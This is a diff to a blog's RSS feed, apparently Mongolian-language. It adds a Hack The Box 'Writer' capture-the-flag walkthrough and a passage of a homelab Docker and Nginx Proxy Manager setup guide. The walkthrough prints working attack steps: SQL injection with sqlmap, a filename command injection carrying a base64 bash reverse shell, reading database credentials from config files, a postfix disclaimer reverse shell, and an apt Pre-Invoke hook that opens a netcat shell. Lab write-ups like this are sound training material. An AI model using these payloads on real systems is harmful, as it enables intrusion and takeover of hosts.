@@ -19,6 +19,217 @@
       <pubDate>Sat, 17 Feb 2024 00:00:00 +0000</pubDate>
       <guid>https://cadil.github.io/posts/2024-02-17-htb-winter-writeup/</guid>
       <description>HTB - Winter - Writeup</description>
+      <content:encoded><![CDATA[<h3 id="1-ip-address">1. IP Address</h3>
+<pre tabindex="0"><code># Machine Address
+10.10.11.101
+
+# Local Address
+10.10.14.31
+</code></pre><h3 id="2-nmap">2. Nmap</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sC -sV -oA nmap/writer 10.10.11.101
+</span></span></code></pre></div><pre tabindex="0"><code># Nmap 7.91 scan initiated Fri Sep  3 10:52:33 2021 as: nmap -sC -sV -oA nmap/writer 10.10.11.101
+Nmap scan report for 10.10.11.101
+Host is up (0.21s latency).
+Not shown: 996 closed ports
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)
+|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)
+|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)
+80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Story Bank | Writer.HTB
+139/tcp open  netbios-ssn Samba smbd 4.6.2
+445/tcp open  netbios-ssn Samba smbd 4.6.2
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: 13m54s
+|_nbstat: NetBIOS name: WRITER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-09-03T15:06:47
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Sep  3 10:52:58 2021 -- 1 IP address (1 host up) scanned in 25.18 seconds
+</code></pre><h3 id="3-gobuster">3. Gobuster</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://10.10.11.101 -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -o gobuster.out
+</span></span></code></pre></div><pre tabindex="0"><code>/contact              (Status: 200) [Size: 4905]
+/logout               (Status: 302) [Size: 208] [--&gt; http://10.10.11.101/]
+/about                (Status: 200) [Size: 3522]
+/static               (Status: 301) [Size: 313] [--&gt; http://10.10.11.101/static/]
+/.                    (Status: 200) [Size: 11976]
+/dashboard            (Status: 302) [Size: 208] [--&gt; http://10.10.11.101/]
+/server-status        (Status: 403) [Size: 277]
+/administrative       (Status: 200) [Size: 1443]
+</code></pre><p><code>administrative</code></p>
+<h3 id="4-sqlmap">4. SQLMap</h3>
+<p>SQL Injection үзсэн, логин хийгээгүй:</p>
+<pre tabindex="0"><code>&#39;or 1=1 -- -
+</code></pre><p>Тэхээр нь Burp логин хийж байгаа хүсэлтийг файл хэлбэрээр хадаглах:</p>
+<pre tabindex="0"><code class="language-login.req" data-lang="login.req">POST /administrative HTTP/1.1
+Host: 10.10.11.101
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 26
+Origin: http://10.10.11.101
+DNT: 1
+Connection: close
+Referer: http://10.10.11.101/administrative
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+uname=admin&amp;password=admin
+</code></pre><p>Терминал:</p>
+<pre tabindex="0"><code>sqlmap -r login.req --level 5 --risk 3 --threads 10
+</code></pre><p>Үр дүн:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>Parameter: uname <span style="color:#f92672">(</span>POST<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    Type: boolean-based blind
+</span></span><span style="display:flex;"><span>    Title: OR boolean-based blind - WHERE or HAVING clause
+</span></span><span style="display:flex;"><span>    Payload: uname<span style="color:#f92672">=</span>-1182<span style="color:#960050;background-color:#1e0010">&#39;</span> OR 8638<span style="color:#f92672">=</span>8638-- ITHB&amp;password<span style="color:#f92672">=</span>admin
+</span></span><span style="display:flex;"><span>---
+</span></span></code></pre></div><p>Testing</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -r login.req --dump-all
+</span></span></code></pre></div><p>Цаашаа уншаад хэрэгтэй зүйл буцаагаагүй. Хэрэгтэй output-г аваад логин хийж орсон.</p>
+<h3 id="5-image-upload">5. Image Upload</h3>
+<p><strong>init</strong>.py</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;image_url&#39;</span>):
+</span></span><span style="display:flex;"><span>	    image_url <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;image_url&#39;</span>)
+</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;.jpg&#34;</span> <span style="color:#f92672">in</span> image_url:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>		    local_filename, headers <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>urlretrieve(image_url)
+</span></span><span style="display:flex;"><span>		    os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;mv </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.jpg&#34;</span><span style="color:#f92672">.</span>format(local_filename, local_filename))
+</span></span><span style="display:flex;"><span>		    image <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">.jpg&#34;</span><span style="color:#f92672">.</span>format(local_filename)
+</span></span><span style="display:flex;"><span>		    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>			im <span style="color:#f92672">=</span> Image<span style="color:#f92672">.</span>open(image) 
+</span></span><span style="display:flex;"><span>			im<span style="color:#f92672">.</span>verify()
+</span></span><span style="display:flex;"><span>			im<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>			image <span style="color:#f92672">=</span> image<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;/tmp/&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>			os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;mv /tmp/</span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> /var/www/writer.htb/writer/static/img/</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(image, image))
+</span></span><span style="display:flex;"><span>			image <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/img/</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(image)
+</span></span><span style="display:flex;"><span>		    <span style="color:#66d9ef">except</span> PIL<span style="color:#f92672">.</span>UnidentifiedImageError:
+</span></span><span style="display:flex;"><span>			os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;rm </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(image))
+</span></span><span style="display:flex;"><span>			error <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Not a valid image file!&#34;</span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;add.html&#39;</span>, error<span style="color:#f92672">=</span>error)
+</span></span></code></pre></div><p>Post хэсэгт image upload хийхээр болсон.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo -n <span style="color:#e6db74">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1&#39;&#34;</span> | base64
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>touch <span style="color:#e6db74">&#39;1.jpg; `echo &lt;BASE64 ENCODED PAYLOAD&gt; | base64 -d | bash `;&#39;</span>
+</span></span></code></pre></div><p>Бэлдээд stories хэсгийн зургийг re-upload хийнэ. Орсон эсэхийг <code>static/img</code>-с ороод шалган орсон байгаа бол энэ удаад burp - дамжуулж image_url хэсгийг өөрчилнө. Image нэр хэсэгт jpg хэсгийн ар талыг арилгав.</p>
+<pre tabindex="0"><code>file:///var/www/writer.htb/writer/static/img/1.jpg; `echo &lt;ENCHODED PAYLOAD&gt; | base64 -d | bash `;
+</code></pre><h3 id="6-enumeration">6. Enumeration</h3>
+<p>Services шалгаж үзнэ</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">### ss -tupln</span>
+</span></span></code></pre></div><p>/etc/mysql/mariadb.cnf - с username, password хараж болохоор байна.</p>
+<pre tabindex="0"><code>www-data@writer:$ cd /etc/mysql
+www-data@writer:/etc/mysql$ ls
+conf.d
+debian-start
+debian.cnf
+mariadb.cnf
+mariadb.conf.d
+my.cnf
+my.cnf.fallback
+www-data@writer:/etc/mysql$ cat mariadb.cnf
+# The MariaDB configuration file
+#
+# The MariaDB/MySQL tools read configuration files in the following order:
+# 1. &#34;/etc/mysql/mariadb.cnf&#34; (this file) to set global defaults,
+# 2. &#34;/etc/mysql/conf.d/*.cnf&#34; to set global options.
+# 3. &#34;/etc/mysql/mariadb.conf.d/*.cnf&#34; to set MariaDB-only options.
+# 4. &#34;~/.my.cnf&#34; to set user-specific options.
+#
+# If the same option is defined multiple times, the last one will apply.
+#
+# One can use all long options that the program supports.
+# Run program with --help to get a list of available options and with
+# --print-defaults to see which it would actually understand and use.
+
+#
+# This group is read both both by the client and the server
+# use it for options that affect everything
+#
+[client-server]
+
+# Import all .cnf files from configuration directory
+!includedir /etc/mysql/conf.d/
+!includedir /etc/mysql/mariadb.conf.d/
+
+[client]
+database = dev
+user = djangouser
+password = DjangoSuperPassword
+default-character-set = utf8
+</code></pre><p>Кyle-н нууг үг олох:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mysql -u djangouser -h 127.0.0.1 -p
+</span></span><span style="display:flex;"><span>DjangoSuperPassword
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>show databases;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>use dev;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>show tables;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SELECT * FROM auth_user;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A<span style="color:#f92672">=</span>
+</span></span></code></pre></div><p>hashcat ашгилаад тайлах бололтой. Мэдэхгүй болохоор бэлэн тайлсан үг ашиглсан. (marcoantonio)</p>
+<p>Kyle-р дамжаад John руу</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh kyle@writer.htb
+</span></span></code></pre></div><p>Мэйл илгээж disclaimer-р г trigger хийгээд дотор нь reverse shell хийнэ.
+<code>/etc/postfix/disclaimer</code></p>
+<pre tabindex="0"><code>bash -i &amp;&gt;/dev/tcp/&lt;YOUR IP&gt;/&lt;PORT&gt; 0&gt;&amp;1
+INSPECT_DIR=/var/spool/filter
+SENDMAIL=/usr/sbin/sendmail
+</code></pre><p>Эхний мөр trigger хийнэ.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> smtplib
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">25</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>From <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;kyle@writer.htb&#39;</span>
+</span></span><span style="display:flex;"><span>To <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;john@writer.htb&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74"> Subject: HI THERE! JOHN
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> OOPS I GOT YOU MATE.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        io <span style="color:#f92672">=</span> smtplib<span style="color:#f92672">.</span>SMTP(host,port)
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>ehlo()
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendmail(From,To,Message)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> Exceptions <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        print (e)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">finally</span>:
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>quit()
+</span></span></code></pre></div><pre tabindex="0"><code>python3 script.py
+</code></pre><p>nc асаагаад тэгээд John руу орохыг хүлээнэ. John ороод id_rsa авна. Хуулж аваад ssh хийхээс өмнө  <code>chmod 600</code> хийгээд нэвтрэн орно.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -i id_rsa john@writer.htb
+</span></span></code></pre></div><p>John <code>/etc/apt/apt.conf.d</code> - бичилт хийх боломжтой байна. Management group-т байна.</p>
+<p><code>pspy64s</code> суулгана.
+Local</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkdir www
+</span></span><span style="display:flex;"><span>cd www
+</span></span><span style="display:flex;"><span>mv ~/dir/pspy64s .
+</span></span><span style="display:flex;"><span>python3 -m http.server
+</span></span></code></pre></div><p>Machine</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl &lt;local ip&gt;:8000/pspy64s -o pspy64s
+</span></span><span style="display:flex;"><span>chmod +x pspy64s
+</span></span><span style="display:flex;"><span>./pspy64s
+</span></span></code></pre></div><h3 id="7-exploitation">7. Exploitation</h3>
+<p><a href="https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/">https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;apt::Update::Pre-Invoke {&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;YOUR IP&gt; &lt;PORT&gt; &gt;/tmp/f&#34;};&#39;</span> &gt; /etc/apt/apt.conf.d/00-pwn
+</span></span></code></pre></div>]]></content:encoded>
     </item>
     <item>
       <title>Thinkpad R500-д Almalinux 8 OS &#43; Docker &#43; Nginx proxy manager &#43; SSL certificate &#43; DuckDNS</title>
@@ -26,6 +237,273 @@
       <pubDate>Thu, 18 Jan 2024 00:00:00 +0000</pubDate>
       <guid>https://cadil.github.io/posts/2024-01-18-docker-thinkpadr500/</guid>
       <description>Nginx Proxy Manager &#43; DuckDNS &#43; Containers</description>
+      <content:encoded><![CDATA[<h4 id="os">OS</h4>
+<p>Almalinux 8.9 minimal <a href="https://mirrors.almalinux.org/isos/x86_64/8.9.html">ISO</a> суулгасан. Суулгах явцад root-с тусад нь user үүсгэн wheel группд нэмсэн.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># hostnamectl</span>
+</span></span><span style="display:flex;"><span>         Icon name: computer-laptop
+</span></span><span style="display:flex;"><span>           Chassis: laptop
+</span></span><span style="display:flex;"><span>  Operating System: AlmaLinux 8.9 <span style="color:#f92672">(</span>Midnight Oncilla<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>       CPE OS Name: cpe:/o:almalinux:almalinux:8::baseos
+</span></span><span style="display:flex;"><span>            Kernel: Linux 4.18.0-513.9.1.el8_9.x86_64
+</span></span><span style="display:flex;"><span>      Architecture: x86-64
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># lshw</span>
+</span></span><span style="display:flex;"><span>    vendor: LENOVO
+</span></span><span style="display:flex;"><span>    version: ThinkPad R500
+</span></span><span style="display:flex;"><span>    cpu: Celeron<span style="color:#f92672">(</span>R<span style="color:#f92672">)</span> Dual-Core CPU T3100 @ 1.90GHz
+</span></span><span style="display:flex;"><span>    ram: 8G DDR2 800MHz
+</span></span></code></pre></div><h4 id="docker--docker-compose">Docker &amp; docker compose</h4>
+<p>Суулгах</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo dnf upgrade
+</span></span><span style="display:flex;"><span>sudo dnf install yum-utils
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sudo dnf install docker-ce docker-ce-cli containerd.io docker-compose-plugin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Complete бол сервис асаана</span>
+</span></span><span style="display:flex;"><span>sudo systemctl start docker
+</span></span><span style="display:flex;"><span>sudo systemctl enable docker
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># check version</span>
+</span></span><span style="display:flex;"><span>docker --version
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Docker version 24.0.7, build afdd53b</span>
+</span></span><span style="display:flex;"><span>docker-compose --version
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Docker Compose version v2.12.2</span>
+</span></span></code></pre></div><p>Compose ажиллахгүй бол энэ аргаар суулгана:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -L <span style="color:#e6db74">&#34;https://github.com/docker/compose/releases/download/v2.12.2/docker-compose-</span><span style="color:#66d9ef">$(</span>uname -s<span style="color:#66d9ef">)</span><span style="color:#e6db74">-</span><span style="color:#66d9ef">$(</span>uname -m<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> -o /usr/bin/docker-compose
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chmod +x /usr/bin/docker-compose
+</span></span></code></pre></div><p>Non root user бол docker group үүсгээд sudo үүсгэх боломжтой болгоорой.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Add alma user to wheel group</span>
+</span></span><span style="display:flex;"><span>sudo usermod -aG wheel alma
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Add alma user to docker group</span>
+</span></span><span style="display:flex;"><span>sudo usermod -aG docker alma
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># groups</span>
+</span></span><span style="display:flex;"><span>alma wheel docker
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># id</span>
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>alma<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>alma<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>alma<span style="color:#f92672">)</span>,10<span style="color:#f92672">(</span>wheel<span style="color:#f92672">)</span>,992<span style="color:#f92672">(</span>docker<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h4 id="docker-compose">Docker compose</h4>
+<p><code>nginxproxymanager</code>, <code>nextcloud</code>, <code>homeassistant</code>, <code>jellyfin</code>, <code>odoo+postgres</code> docker compose бүрдэнэ. Nginx proxy manager дээр HTTPS (Let&rsquo;s encrypt) авахад бас DuckDNS domain авахад ашиглана. Docker network-оо дундаа ашиглана. 3 port docker -с host руу 80, 81, 443 expose хийсэн.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#f92672">version</span>: <span style="color:#e6db74">&#39;2.2&#39;</span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">services</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">nginxproxymanager</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#e6db74">&#39;jc21/nginx-proxy-manager:latest&#39;</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">nginxproxymanager</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">restart</span>: <span style="color:#ae81ff">unless-stopped </span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">ports</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;80:80&#39;</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;81:81&#39;</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#39;443:443&#39;</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">volumes</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">./nginx/data:/data</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">./nginx/letsencrypt:/etc/letsencrypt</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e"># default cred: admin@example.com, changeme</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">nextcloud</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">lscr.io/linuxserver/nextcloud:latest</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">nextcloud</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">environment</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">PUID=1000</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">PGID=1000</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">TZ=Asia/Ulaanbaatar</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">volumes</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">./nextcloud/appdata:/config </span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">./nextcloud/data:/data</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">restart</span>: <span style="color:#ae81ff">unless-stopped </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">homeassistant</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">lscr.io/linuxserver/homeassistant:latest</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">homeassistant </span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">environment</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">PUID=1000</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">PGID=1000</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">TZ=Asia/Ulaanbaatar</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">volumes</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">./hass/config:/config </span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">restart</span>: <span style="color:#ae81ff">unless-stopped</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">jellyfin</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">lscr.io/linuxserver/jellyfin:latest</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">jellyfin </span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">environment</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">PUID=1000</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">PGID=1000</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">TZ=Asia/Ulaanbaatar</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">volumes</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">./jellyfin/config:/config</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">./jellyfin/tvshows:/data/tvshows</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">./jellyfin/movies:/data/movies </span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">restart</span>: <span style="color:#ae81ff">unless-stopped</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">postgresql</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">docker.io/bitnami/postgresql:16</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">container_name</span>: <span style="color:#ae81ff">postgresql</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">environment</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">PUID=1000</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">PGID=1000</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">TZ=Asia/Ulaanbaatar</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">ALLOW_EMPTY_PASSWORD=yes</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">POSTGRESQL_USERNAME=bn_odoo</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">POSTGRESQL_DATABASE=bitnami_odoo</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">volumes</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">./postgresql/postgresql-persistence:/bitnami/postgresql</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">restart</span>: <span style="color:#ae81ff">unless-stopped</span>
